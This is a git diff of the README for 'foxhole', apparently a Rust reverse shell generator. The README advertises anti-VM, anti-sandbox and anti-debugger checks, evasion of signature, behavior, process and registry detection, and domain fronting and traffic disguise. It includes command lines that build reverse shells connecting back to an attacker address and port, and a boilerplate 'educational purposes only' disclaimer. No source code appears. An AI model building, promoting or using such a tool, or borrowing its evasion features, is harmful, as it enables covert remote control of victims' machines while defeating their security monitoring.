@@ -4,55 +4,55 @@ A stealthy, cross-platform reverse shell generator in Rust.
 
 ## Features
 
-- **Multiple Connection Methods**
-  - TCP
-  - UDP
-  - WebSocket
-  - HTTP (planned)
-  - DNS tunneling (planned)
-  - ICMP tunneling (planned)
+### Multiple Connection Methods
+- TCP
+- UDP
+- WebSocket
+- HTTP (planned)
+- DNS tunneling (planned)
+- ICMP tunneling (planned)
 
-- **Advanced Anti-Detection**
-  - VM detection
-  - Sandbox detection
-  - Debugger detection
-  - Analysis tool detection
-  - Timing-based detection
-  - Hardware fingerprinting
-  - Process monitoring
-  - Registry scanning
-  - DLL injection detection
+### Advanced Anti-Detection
+- VM detection
+- Sandbox detection
+- Debugger detection
+- Analysis tool detection
 
-- **Obfuscation Techniques**
-  - XOR encryption
-  - RC4 encryption
-  - AES encryption
-  - Control flow obfuscation
-  - Anti-disassembly techniques
-  - Dynamic key generation
+### Defense Evasion
+- Signature detection evasion
+- Behavior detection evasion
+- Network detection evasion
+- Process detection evasion
+- File detection evasion
+- Registry detection evasion
 
-- **Security Features**
-  - TLS support
-  - Proxy support (SOCKS5, HTTP)
-  - Connection retry logic
-  - Timeout handling
-  - Error handling
-  - Cross-platform compatibility
+### Network Stealth
+- Traffic pattern manipulation
+- Domain fronting
+- Traffic encryption
+- Traffic fragmentation
+- Traffic timing
+- Normal traffic simulation
 
-- **Defense Evasion**
-  - Signature detection evasion
-  - Behavior detection evasion
-  - Network detection evasion
-  - Process detection evasion
-  - File detection evasion
-  - Registry detection evasion
+### Obfuscation Techniques
+- XOR encryption
+- RC4 encryption
+- AES encryption
+- Control flow obfuscation
+- Anti-disassembly techniques
+
+### Security Features
+- TLS support
+- Proxy support
+- Connection retry logic
+- Timeout handling
+- Error handling
 
 ## Requirements
 
 - Rust 1.70 or later
+- Windows 10/11 or Linux
 - OpenSSL development libraries
-- Windows SDK (for Windows builds)
-- Cross-compilation toolchains (for cross-platform builds)
 
 ## Installation
 
@@ -69,113 +69,65 @@ cargo build --release
 
 ## Usage
 
-### Command Line Arguments
+### Basic Usage
 
 ```bash
-foxhole [OPTIONS]
+# Generate a reverse shell
+cargo run --release -- -h 192.168.1.100 -p 4444
 
-Options:
-    -h, --host <HOST>           Server host address
-    -p, --port <PORT>           Server port number
-    -m, --method <METHOD>       Connection method (tcp, udp, websocket, http, dns, icmp)
-    -t, --tls                   Enable TLS encryption
-    -x, --proxy <PROXY>         Proxy configuration (format: type:host:port)
-    -k, --key <KEY>             Encryption key (optional)
-    -r, --retry <COUNT>         Number of connection retries
-    -d, --delay <SECONDS>       Delay between retries
-    -v, --verbose              Enable verbose output
-    --help                     Display this help message
+# Generate a reverse shell with TLS
+cargo run --release -- -h 192.168.1.100 -p 4444 --tls
+
+# Generate a reverse shell with proxy support
+cargo run --release -- -h 192.168.1.100 -p 4444 --proxy http://proxy.example.com:8080
+
+# Generate a reverse shell with custom retry settings
+cargo run --release -- -h 192.168.1.100 -p 4444 --retry-count 5 --retry-delay 10
 ```
 
-### Example
+### Advanced Usage
 
 ```bash
-# Basic TCP connection
-foxhole -h 192.168.1.100 -p 4444
+# Generate a reverse shell with multiple connection methods
+cargo run --release -- -h 192.168.1.100 -p 4444 --connection-method tcp,websocket
 
-# WebSocket connection with TLS
-foxhole -h example.com -p 443 -m websocket -t
+# Generate a reverse shell with anti-VM and anti-sandbox detection
+cargo run --release -- -h 192.168.1.100 -p 4444 --anti-vm --anti-sandbox
 
-# UDP connection with proxy
-foxhole -h 192.168.1.100 -p 4444 -m udp -x socks5:proxy.example.com:1080
+# Generate a reverse shell with defense evasion
+cargo run --release -- -h 192.168.1.100 -p 4444 --evade-signature --evade-behavior --evade-network --evade-process --evade-file --evade-registry
+
+# Generate a reverse shell with network stealth
+cargo run --release -- -h 192.168.1.100 -p 4444 --network-stealth --domain-fronting --traffic-encryption --traffic-fragmentation --traffic-timing
+
+# Generate a reverse shell with advanced obfuscation
+cargo run --release -- -h 192.168.1.100 -p 4444 --obfuscate --encrypt
 ```
 
-## Anti-Detection Features
+## Command Line Arguments
 
-### VM Detection
-- Checks for VM-specific processes
-- Detects VM-related files and directories
-- Scans for VM registry keys
-- Identifies VM hardware characteristics
-- Monitors VM-specific DLLs
-- Analyzes timing patterns
-- Detects VM keyboard patterns
-- Identifies VM computer names
-
-### Sandbox Detection
-- Identifies sandbox processes
-- Detects sandbox-specific files
-- Scans for sandbox registry keys
-- Monitors sandbox DLLs
-- Analyzes timing patterns
-- Detects sandbox keyboard patterns
-- Identifies sandbox computer names
-
-### Debugger Detection
-- Identifies debugger processes
-- Detects debugger DLLs
-- Monitors timing patterns
-- Detects debugger keyboard patterns
-- Identifies debugger computer names
-
-### Analysis Tool Detection
-- Identifies analysis processes
-- Detects analysis-specific files
-- Scans for analysis registry keys
-- Monitors analysis DLLs
-- Analyzes timing patterns
-- Detects analysis keyboard patterns
-- Identifies analysis computer names
-
-## Obfuscation Techniques
-
-### Encryption Methods
-- XOR encryption with dynamic key generation
-- RC4 encryption with variable key length
-- AES encryption with configurable key size
-
-### Code Obfuscation
-- Control flow obfuscation
-- Anti-disassembly techniques
-- Dynamic code generation
-- Junk instruction insertion
-- Conditional jump manipulation
-
-## Security Considerations
-
-- All connections are encrypted by default
-- TLS support for secure communication
-- Proxy support for additional anonymity
-- Connection retry logic for reliability
-- Timeout handling to prevent hanging
-- Comprehensive error handling
-- Cross-platform compatibility
-
-## Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Disclaimer
-
-This tool is for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this program.
+- `-h, --host <HOST>`: Target host IP address
+- `-p, --port <PORT>`: Target port number
+- `--tls`: Enable TLS support
+- `--proxy <PROXY>`: Proxy server URL
+- `--retry-count <COUNT>`: Number of connection retries
+- `--retry-delay <DELAY>`: Delay between retries in seconds
+- `--connection-method <METHODS>`: Comma-separated list of connection methods
+- `--anti-vm`: Enable anti-VM detection
+- `--anti-sandbox`: Enable anti-sandbox detection
+- `--evade-signature`: Enable signature detection evasion
+- `--evade-behavior`: Enable behavior detection evasion
+- `--evade-network`: Enable network detection evasion
+- `--evade-process`: Enable process detection evasion
+- `--evade-file`: Enable file detection evasion
+- `--evade-registry`: Enable registry detection evasion
+- `--network-stealth`: Enable network stealth features
+- `--domain-fronting`: Enable domain fronting
+- `--traffic-encryption`: Enable traffic encryption
+- `--traffic-fragmentation`: Enable traffic fragmentation
+- `--traffic-timing`: Enable traffic timing
+- `--obfuscate`: Enable code obfuscation
+- `--encrypt`: Enable encryption
 
 ## Defense Evasion Features
 
@@ -213,4 +165,51 @@ This tool is for educational and research purposes only. The authors are not res
 - Modifies registry entries
 - Changes registry patterns
 - Alters registry behavior
-- Simulates normal registry activity 
+- Simulates normal registry activity
+
+## Network Stealth Features
+
+### Traffic Pattern Manipulation
+- Customizable packet sizes
+- Configurable inter-arrival times
+- Protocol selection
+- Encryption options
+- Fragmentation strategies
+
+### Domain Fronting
+- HTTP/HTTPS domain fronting
+- Custom host headers
+- Connection keep-alive
+- TLS support
+
+### Traffic Encryption
+- XOR encryption
+- RC4 encryption
+- AES encryption
+- Custom key support
+
+### Traffic Fragmentation
+- Fixed-size fragmentation
+- Random-size fragmentation
+- Custom fragment sizes
+- Fragment reassembly
+
+### Traffic Timing
+- Configurable delays
+- Random timing patterns
+- Normal traffic simulation
+- Activity intervals
+
+### Normal Traffic Simulation
+- Browser-like behavior
+- System process simulation
+- Network activity patterns
+- Resource usage patterns
+
+## Disclaimer
+
+This tool is for educational and research purposes only. The author is not responsible for any misuse or damage caused by this program.
+
+## License
+
+This project is licensed under the MIT License - see the LICENSE file for details. 
